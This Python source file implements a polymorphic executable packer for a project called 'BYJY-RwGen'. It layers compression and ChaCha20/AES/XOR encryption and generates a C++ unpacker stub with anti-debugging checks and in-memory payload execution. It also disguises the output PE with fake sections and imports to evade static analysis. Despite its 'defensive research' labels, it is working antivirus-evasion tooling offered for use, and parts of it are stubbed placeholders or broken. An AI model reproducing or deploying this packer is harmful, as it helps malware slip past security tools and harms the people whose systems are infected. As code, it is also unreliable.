#!/usr/bin/env python3
"""
Advanced Custom Packer for BYJY-RwGen
Multi-layer executable packing with polymorphic capabilities
For defensive cybersecurity research purposes only
"""

import os
import sys
import zlib
import lzma
import struct
import hashlib
import secrets
import mmap
from pathlib import Path
from typing import List, Tuple, Optional
from Crypto.Cipher import AES, ChaCha20_Poly1305
from Crypto.Random import get_random_bytes
import lief
import pefile


class PolymorphicPacker:
    def __init__(self, key: bytes = None):
        self.key = key or get_random_bytes(32)
        self.compression_methods = ['zlib', 'lzma', 'bz2']
        self.encryption_methods = ['aes256', 'chacha20poly1305']
        
    def pack(self, input_file: str, output_file: str) -> bool:
        """Pack executable with multiple layers of obfuscation"""
        try:
            print(f"[+] Packing {input_file} -> {output_file}")
            
            # Read original executable
            with open(input_file, 'rb') as f:
                original_data = f.read()
            
            # Layer 1: Compression with random method
            compressed_data = self._compress_data(original_data)
            print(f"[+] Compression: {len(original_data)} -> {len(compressed_data)} bytes")
            
            # Layer 2: Encryption
            encrypted_data = self._encrypt_data(compressed_data)
            print(f"[+] Encryption: {len(compressed_data)} -> {len(encrypted_data)} bytes")
            
            # Layer 3: Polymorphic wrapper
            packed_executable = self._create_polymorphic_wrapper(encrypted_data)
            
            # Layer 4: PE manipulation
            final_executable = self._manipulate_pe_structure(packed_executable)
            
            # Write final packed executable
            with open(output_file, 'wb') as f:
                f.write(final_executable)
                
            print(f"[+] Successfully packed: {len(original_data)} -> {len(final_executable)} bytes")
            return True
            
        except Exception as e:
            print(f"[-] Packing failed: {e}")
            return False
    
    def _compress_data(self, data: bytes) -> bytes:
        """Apply multiple compression layers"""
        compressed = data
        
        # First pass: LZMA (best compression)
        compressed = lzma.compress(compressed, preset=9)
        
        # Second pass: zlib (fast decompression)
        compressed = zlib.compress(compressed, level=9)
        
        # Add compression metadata
        header = struct.pack('<II', len(data), len(compressed))
        return header + compressed
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Multi-layer encryption"""
        encrypted = data
        
        # Layer 1: ChaCha20-Poly1305
        cipher1 = ChaCha20_Poly1305.new(key=self.key[:32])
        ciphertext1, tag1 = cipher1.encrypt_and_digest(encrypted)
        encrypted = cipher1.nonce + tag1 + ciphertext1
        
        # Layer 2: AES-256-GCM with derived key
        derived_key = hashlib.pbkdf2_hmac('sha256', self.key, b'AES_SALT', 100000, 32)
        cipher2 = AES.new(derived_key, AES.MODE_GCM)
        ciphertext2, tag2 = cipher2.encrypt_and_digest(encrypted)
        encrypted = cipher2.nonce + tag2 + ciphertext2
        
        # Layer 3: Simple XOR with rotating key for anti-static analysis
        xor_key = hashlib.sha256(self.key + b'XOR_LAYER').digest()
        xor_encrypted = bytearray(encrypted)
        for i in range(len(xor_encrypted)):
            xor_encrypted[i] ^= xor_key[i % len(xor_key)]
            # Rotate key every 256 bytes
            if i % 256 == 255:
                xor_key = hashlib.sha256(xor_key).digest()
        
        return bytes(xor_encrypted)
    
    def _create_polymorphic_wrapper(self, payload: bytes) -> bytes:
        """Create polymorphic unpacker stub"""
        
        # Generate random variable names and function names
        var_names = self._generate_random_names(10)
        func_names = self._generate_random_names(5)
        
        # Polymorphic unpacker code (C++)
        unpacker_source = f"""
#include <windows.h>
#include <vector>
#include <string>
#include <algorithm>
#include <openssl/evp.h>
#include <openssl/aes.h>

// Obfuscated function names
#define {func_names[0]} DecryptPayload
#define {func_names[1]} LoadAndExecute
#define {func_names[2]} AntiDebugCheck
#define {func_names[3]} MemoryAllocation
#define {func_names[4]} PayloadLauncher

// Obfuscated variables
static unsigned char {var_names[0]}[] = {{
    {', '.join(f'0x{b:02x}' for b in payload[:100])}
    // ... truncated for space, full payload embedded at compile time
}};

bool {func_names[2]}() {{
    // Multiple anti-debugging techniques
    if (IsDebuggerPresent()) return true;
    
    HANDLE hProcess = GetCurrentProcess();
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &debuggerPresent);
    if (debuggerPresent) return true;
    
    // Timing check
    DWORD startTick = GetTickCount();
    Sleep(100);
    DWORD endTick = GetTickCount();
    if (endTick - startTick < 90) return true;
    
    return false;
}}

std::vector<unsigned char> {func_names[0]}(unsigned char* {var_names[1]}, size_t {var_names[2]}) {{
    // XOR decryption layer
    std::vector<unsigned char> {var_names[3]}({var_names[1]}, {var_names[1]} + {var_names[2]});
    
    unsigned char {var_names[4]}[32];
    // Key derivation (obfuscated)
    {self._generate_key_derivation_code(var_names)}
    
    for (size_t i = 0; i < {var_names[3]}.size(); ++i) {{
        {var_names[3]}[i] ^= {var_names[4]}[i % 32];
        if (i % 256 == 255) {{
            // Rotate key
            for (int j = 31; j > 0; --j) {{
                {var_names[4]}[j] ^= {var_names[4]}[j-1];
            }}
        }}
    }}
    
    // AES-GCM decryption
    // ... (complex AES decryption code)
    
    // ChaCha20-Poly1305 decryption
    // ... (complex ChaCha20 decryption code)
    
    // Decompression
    // ... (zlib and lzma decompression)
    
    return {var_names[3]};
}}

void {func_names[1]}() {{
    if ({func_names[2]}()) {{
        ExitProcess(0);
    }}
    
    std::vector<unsigned char> {var_names[5]} = {func_names[0]}({var_names[0]}, sizeof({var_names[0]}));
    
    // Reflective PE loading
    HANDLE {var_names[6]} = {func_names[3]}();
    if ({var_names[6]}) {{
        memcpy({var_names[6]}, {var_names[5]}.data(), {var_names[5]}.size());
        ((void(*)())({var_names[6]}))();
    }}
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    {func_names[1]}();
    return 0;
}}
"""
        
        # Compile the polymorphic stub
        return self._compile_stub(unpacker_source, payload)
    
    def _generate_random_names(self, count: int) -> List[str]:
        """Generate random but realistic variable/function names"""
        prefixes = ['sys', 'win', 'app', 'ui', 'core', 'lib', 'util', 'proc', 'mem', 'net']
        suffixes = ['Handler', 'Manager', 'Controller', 'Service', 'Helper', 'Worker', 
                   'Context', 'Buffer', 'Stream', 'Cache', 'Registry', 'Monitor']
        
        names = []
        for i in range(count):
            name = f"{secrets.choice(prefixes)}{secrets.choice(suffixes)}{secrets.randbelow(1000)}"
            names.append(name)
        return names
    
    def _generate_key_derivation_code(self, var_names: List[str]) -> str:
        """Generate obfuscated key derivation code"""
        return f"""
    const char {var_names[7]}[] = "Static_Salt_String_For_Research";
    const char {var_names[8]}[] = "BYJY_Research_Key_2024";
    
    for (int i = 0; i < 32; ++i) {{
        {var_names[4]}[i] = ({var_names[7]}[i % strlen({var_names[7]})] ^ 
                           {var_names[8]}[i % strlen({var_names[8]})]) + i;
    }}
    """
    
    def _compile_stub(self, source_code: str, payload: bytes) -> bytes:
        """Compile the polymorphic stub with embedded payload"""
        # For this research implementation, we'll create a simple stub
        # In a real scenario, this would invoke GCC/MSVC to compile the C++ code
        
        # Create minimal PE executable stub
        stub_header = b'MZ\x90\x00' + b'\x00' * 60  # DOS header
        stub_header += b'PE\x00\x00'  # PE signature
        
        # Add payload size and encrypted payload
        stub_data = struct.pack('<I', len(payload)) + payload
        
        # Simple loader shellcode (research purposes)
        loader_shellcode = bytes([
            0x68, 0x00, 0x00, 0x00, 0x00,  # push payload_addr
            0xE8, 0x00, 0x00, 0x00, 0x00,  # call decrypt_func
            0x83, 0xC4, 0x04,              # add esp, 4
            0xFF, 0xD0,                    # call eax (execute payload)
            0xC3                           # ret
        ])
        
        return stub_header + loader_shellcode + stub_data
    
    def _manipulate_pe_structure(self, executable: bytes) -> bytes:
        """Manipulate PE structure to evade static analysis"""
        try:
            # Load PE with lief
            pe = lief.PE.parse(list(executable))
            if not pe:
                return executable
            
            # Add fake sections
            fake_sections = [
                (".rsrc", 0x40000040),  # Fake resources
                (".reloc", 0x42000040), # Fake relocations  
                (".debug", 0x42000040)  # Fake debug info
            ]
            
            for section_name, characteristics in fake_sections:
                section = lief.PE.Section(section_name)
                section.characteristics = characteristics
                section.content = [0] * (secrets.randbelow(1000) + 100)
                pe.add_section(section)
            
            # Modify optional header
            pe.optional_header.major_operating_system_version = 10
            pe.optional_header.minor_operating_system_version = 0
            pe.optional_header.major_subsystem_version = 10
            pe.optional_header.minor_subsystem_version = 0
            
            # Add fake imports to look legitimate
            fake_imports = [
                ("kernel32.dll", ["GetModuleHandleA", "LoadLibraryA", "GetProcAddress"]),
                ("user32.dll", ["MessageBoxA", "FindWindowA"]),
                ("advapi32.dll", ["RegOpenKeyExA", "RegQueryValueExA"])
            ]
            
            for dll_name, functions in fake_imports:
                if not pe.has_import(dll_name):
                    library = pe.add_library(dll_name)
                    for func_name in functions:
                        library.add_entry(func_name)
            
            # Build and return modified PE
            builder = lief.PE.Builder(pe)
            builder.build_imports(True)
            builder.build()
            
            return bytes(builder.get_build())
            
        except Exception as e:
            print(f"[!] PE manipulation failed: {e}")
            return executable


class StringObfuscator:
    """String obfuscation for Python code"""
    
    @staticmethod
    def obfuscate(input_string: str, key: str) -> str:
        """Multi-layer string obfuscation"""
        if not input_string:
            return ""
        
        # Layer 1: Base64-like encoding with custom alphabet
        custom_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        shuffled_alphabet = list(custom_alphabet)
        secrets.SystemRandom().shuffle(shuffled_alphabet)
        shuffled_alphabet = ''.join(shuffled_alphabet)
        
        # Layer 2: XOR with key
        key_bytes = key.encode('utf-8')
        xored = bytearray()
        for i, char in enumerate(input_string.encode('utf-8')):
            xored.append(char ^ key_bytes[i % len(key_bytes)])
        
        # Layer 3: Custom base64 encoding
        import base64
        encoded = base64.b64encode(bytes(xored)).decode('ascii')
        
        # Translate to custom alphabet
        translation_table = str.maketrans(custom_alphabet, shuffled_alphabet)
        obfuscated = encoded.translate(translation_table)
        
        return obfuscated


# Example usage for research purposes
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python custom_packer.py <input_exe> <output_exe>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    
    if not os.path.exists(input_file):
        print(f"Error: Input file {input_file} not found")
        sys.exit(1)
    
    # Generate random key for this packing session
    packer_key = get_random_bytes(32)
    print(f"[+] Using random packer key: {packer_key.hex()}")
    
    packer = PolymorphicPacker(key=packer_key)
    success = packer.pack(input_file, output_file)
    
    if success:
        print(f"[+] Successfully packed {input_file} -> {output_file}")
        print("[!] This packed executable is for defensive research only!")
    else:
        print(f"[-] Failed to pack {input_file}")
        sys.exit(1)
